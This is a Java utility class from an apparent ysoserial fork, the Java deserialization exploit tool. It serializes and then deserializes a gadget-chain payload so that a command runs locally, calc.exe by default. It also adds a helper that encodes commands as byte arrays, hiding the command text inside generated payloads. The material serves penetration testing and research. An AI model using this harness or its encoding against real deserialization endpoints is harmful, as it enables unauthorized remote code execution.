package ysoserial.payloads.util;

import java.util.concurrent.Callable;

import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.secmgr.ExecCheckingSecurityManager;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {
	
	/**
	 * check string to args
	 * @param s
	 * @return
	 */
	public static int checkStrIsArgs(String s)
	{
		if(null == s || 0 == s.trim().length())return -1;
		if(-1 < s.indexOf('\n'))return 1;
		try {
			s = java.net.URLDecoder.decode(s, "utf-8");
			if(-1 < s.indexOf('\n'))return 2;
		}catch(Exception e) {}
		
		return -1;
	}
	
	public static String[] str2args(String s,int t)
	{
		if(1 == t)return s.split("\\n");
		if(2 == t)
		{
			try {
				s = java.net.URLDecoder.decode(s, "utf-8");
				return s.split("\\n");
			}catch(Exception e) {}
		}
//		if(-1 == t)return new String[]{s};
		return new String[]{s};
	}
	
	public static String getCmd(String s)
	{
		int t = checkStrIsArgs(s);
		String []a = str2args(s,t);
		
		StringBuilder sb = new StringBuilder("new String[] {"); 
		for(int i = 0; i < a.length; i++)
		{
			if(0 < i)sb.append(",");
			sb.append("new String(new byte[] {");
			try{
				byte []X = a[i].getBytes("UTF-8");
				for(int x = 0; x < X.length;x++)
				{
					if(0 < x)sb.append(",");
					sb.append(X[x]);
				}
			}catch(Exception e) {}
			
			sb.append("})");
		}
		
		
		sb.append("}");
		return sb.toString();
	}
	
//	public static void main(String []args)
//	{
//		System.out.println(getCmd("bash\n-c\necho"));
//	}

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
		// ensure payload generation doesn't throw an exception
		byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
			public byte[] call() throws Exception {
				final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

				System.out.println("generating payload object(s) for command: '" + command + "'");

				ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

				System.out.println("serializing payload");
				byte[] ser = Serializer.serialize(objBefore);
				Utils.releasePayload(payload, objBefore);
                return ser;
		}});

		try {
			System.out.println("deserializing payload");
			final Object objAfter = Deserializer.deserialize(serialized);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

    private static String getDefaultTestCmd() {
	    return getFirstExistingFile(
	        "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        return "calc.exe";
//        for (String path : files) {
//            if (new File(path).exists()) {
//                return path;
//            }
//        }
//        throw new UnsupportedOperationException("no known test executable");
    }
}
